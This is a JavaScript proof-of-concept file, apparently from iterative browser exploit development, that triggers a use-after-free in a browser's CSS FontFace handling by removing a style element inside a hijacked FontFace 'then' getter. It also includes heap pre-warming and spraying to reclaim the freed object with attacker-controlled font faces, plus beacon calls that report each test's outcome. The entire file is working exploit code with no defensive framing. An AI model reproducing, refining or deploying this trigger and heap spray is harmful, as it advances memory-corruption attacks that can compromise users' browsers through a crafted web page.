// p455-fontface-uaf-correct.js — CVE-2026-43715 correct UAF trigger
//
// CRITICAL FIX from V449-V454: those probes used ruleA.style.setProperty()
// which does NOT free the CSSFontFace. The same StyleRuleFontFace is
// re-encountered during buildCompleted → face survives → no UAF.
//
// CORRECT TRIGGER: styleA.remove() during the then getter:
//   1. Removes the <style> → CSS connection lost
//   2. buildCompleted: face NOT encountered → CSSFontFaceSet::remove(face)
//   3. remove() clears m_cache → CSSSegmentedFontFace destroyed
//   4. ~CSSSegmentedFontFace calls removeClient → modifies m_clients
//   5. We're still inside m_clients iteration (setStatus) → iterator invalidation
//
// REQUIREMENT: CSSFontFace must have ≥2 clients:
//   Client 1: FontFace JS wrapper (added in FontFace constructor)
//   Client 2: CSSSegmentedFontFace (added when font is matched for rendering)
//   → We MUST use the font in a visible element before .load()
(function() {
    var RUN = 'v455-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // ═══════════════════════════════════════════════
    // TEST A: Correct UAF — remove style during then getter
    //         with font used in visible element (2 clients)
    // ═══════════════════════════════════════════════
    try {
        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'v455a'; src: local('Arial'), local('Helvetica'), local('sans-serif'); }";
        document.head.appendChild(styleA);
        document.body.offsetHeight;

        var span = document.createElement('span');
        span.style.fontFamily = "'v455a', serif";
        span.textContent = 'ABCDEFGHIJ';
        document.body.appendChild(span);
        document.body.offsetHeight;

        var faceA = null;
        var it = document.fonts.values();
        var e;
        while (!(e = it.next()).done) {
            if (e.value.family.replace(/['"]/g, '') === 'v455a') { faceA = e.value; break; }
        }

        if (!faceA) {
            B('A-NO-FACE', 'not in document.fonts');
        } else {
            B('A-FOUND', 'status=' + faceA.status);

            var thenA = 0, aErr = '';

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenA++;
                if (thenA > 1) return undefined;
                try {
                    styleA.remove();
                    document.body.offsetHeight;
                } catch(e) { aErr += 'then:' + e.message; }
                return undefined;
            }, configurable: true });

            B('A-PRE', 'loading');
            try { faceA.load(); } catch(e) { aErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('A-POST', {thenFired: thenA, err: aErr, status: faceA.status});
        }
    } catch(e) { B('A-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════
    // TEST B: More clients — 20 elements using the font
    // ═══════════════════════════════════════════════
    try {
        var styleB = document.createElement('style');
        styleB.textContent = "@font-face { font-family: 'v455b'; src: local('Arial'), local('Helvetica'), local('sans-serif'); }";
        document.head.appendChild(styleB);
        document.body.offsetHeight;

        for (var i = 0; i < 20; i++) {
            var el = document.createElement('div');
            el.style.fontFamily = "'v455b', serif";
            el.textContent = 'B-text-' + i;
            document.body.appendChild(el);
        }
        document.body.offsetHeight;

        var faceB = null;
        var itB = document.fonts.values();
        var eB;
        while (!(eB = itB.next()).done) {
            if (eB.value.family.replace(/['"]/g, '') === 'v455b') { faceB = eB.value; break; }
        }

        if (!faceB) {
            B('B-NO-FACE', 'not found');
        } else {
            var thenB = 0, bErr = '';

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenB++;
                if (thenB > 1) return undefined;
                try {
                    styleB.remove();
                    document.body.offsetHeight;
                } catch(e) { bErr += 'then:' + e.message; }
                return undefined;
            }, configurable: true });

            B('B-PRE', 'loading');
            try { faceB.load(); } catch(e) { bErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('B-POST', {thenFired: thenB, err: bErr, status: faceB.status});
        }
    } catch(e) { B('B-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════
    // TEST C: Remove style + spray freed slot with new faces
    //         If slot is reused, UAF reads attacker CSSFontFace data
    // ═══════════════════════════════════════════════
    try {
        // Pre-warm IsoHeap: cycle many CSSFontFaces
        var warm = [];
        for (var i = 0; i < 300; i++) {
            var s = document.createElement('style');
            s.textContent = "@font-face { font-family: 'cw" + i + "'; src: local('Arial'); }";
            document.head.appendChild(s);
            warm.push(s);
        }
        document.body.offsetHeight;
        for (var i = 0; i < warm.length; i++) warm[i].remove();
        document.body.offsetHeight;
        warm = [];

        // Second cycle to flush dealloc log
        for (var i = 0; i < 300; i++) {
            var s = document.createElement('style');
            s.textContent = "@font-face { font-family: 'cw2" + i + "'; src: local('Arial'); }";
            document.head.appendChild(s);
            warm.push(s);
        }
        document.body.offsetHeight;
        for (var i = 0; i < warm.length; i++) warm[i].remove();
        document.body.offsetHeight;
        warm = null;

        B('C-WARMED', 'done');

        var styleC = document.createElement('style');
        styleC.textContent = "@font-face { font-family: 'v455c'; src: local('Arial'), local('Helvetica'), local('sans-serif'); }";
        document.head.appendChild(styleC);
        document.body.offsetHeight;

        var spanC = document.createElement('span');
        spanC.style.fontFamily = "'v455c', serif";
        spanC.textContent = 'C-test';
        document.body.appendChild(spanC);
        document.body.offsetHeight;

        var faceC = null;
        var itC = document.fonts.values();
        var eC;
        while (!(eC = itC.next()).done) {
            if (eC.value.family.replace(/['"]/g, '') === 'v455c') { faceC = eC.value; break; }
        }

        if (!faceC) {
            B('C-NO-FACE', 'not found');
        } else {
            var thenC = 0, cErr = '';

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenC++;
                if (thenC > 1) return undefined;
                try {
                    // REMOVE → frees CSSFontFace from face set (FontFace.m_backing still holds ref!)
                    styleC.remove();
                    document.body.offsetHeight;

                    // Spray same-type objects
                    for (var i = 0; i < 300; i++) {
                        var s = document.createElement('style');
                        s.textContent = "@font-face { font-family: 'cs" + i + "'; src: local('ZZZZZ_No_" + i + "'); }";
                        document.head.appendChild(s);
                    }
                    document.body.offsetHeight;
                } catch(e) { cErr += 'then:' + e.message; }
                return undefined;
            }, configurable: true });

            B('C-PRE', 'loading');
            try { faceC.load(); } catch(e) { cErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            // Check spray face statuses
            var loaded = 0, errored = 0, unloaded = 0, total = 0;
            var it2 = document.fonts.values();
            var e2;
            while (!(e2 = it2.next()).done) {
                var fn = e2.value.family.replace(/['"]/g, '');
                if (fn.indexOf('cs') === 0 && fn.length <= 5) {
                    total++;
                    if (e2.value.status === 'loaded') loaded++;
                    else if (e2.value.status === 'error') errored++;
                    else if (e2.value.status === 'unloaded') unloaded++;
                }
            }

            B('C-POST', {thenFired: thenC, err: cErr, status: faceC.status,
                         spray: {total: total, loaded: loaded, errored: errored, unloaded: unloaded}});
        }
    } catch(e) { B('C-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════
    // TEST D: Control — old approach (setProperty, no remove)
    //         Should NOT crash because face is NOT freed
    // ═══════════════════════════════════════════════
    try {
        var styleD = document.createElement('style');
        styleD.textContent = "@font-face { font-family: 'v455d'; src: local('Arial'), local('Helvetica'), local('sans-serif'); }";
        document.head.appendChild(styleD);
        document.body.offsetHeight;

        var spanD = document.createElement('span');
        spanD.style.fontFamily = "'v455d', serif";
        spanD.textContent = 'D-test';
        document.body.appendChild(spanD);
        document.body.offsetHeight;

        var ruleD = styleD.sheet.cssRules[0];
        var faceD = null;
        var itD = document.fonts.values();
        var eD;
        while (!(eD = itD.next()).done) {
            if (eD.value.family.replace(/['"]/g, '') === 'v455d') { faceD = eD.value; break; }
        }

        if (!faceD) {
            B('D-NO-FACE', 'not found');
        } else {
            var thenD = 0, dErr = '';

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenD++;
                if (thenD > 1) return undefined;
                try {
                    ruleD.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;
                } catch(e) { dErr += 'then:' + e.message; }
                return undefined;
            }, configurable: true });

            try { faceD.load(); } catch(e) { dErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('D-POST', {thenFired: thenD, err: dErr, status: faceD.status});
        }
    } catch(e) { B('D-ERR', e.message.slice(0,200)); }


    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
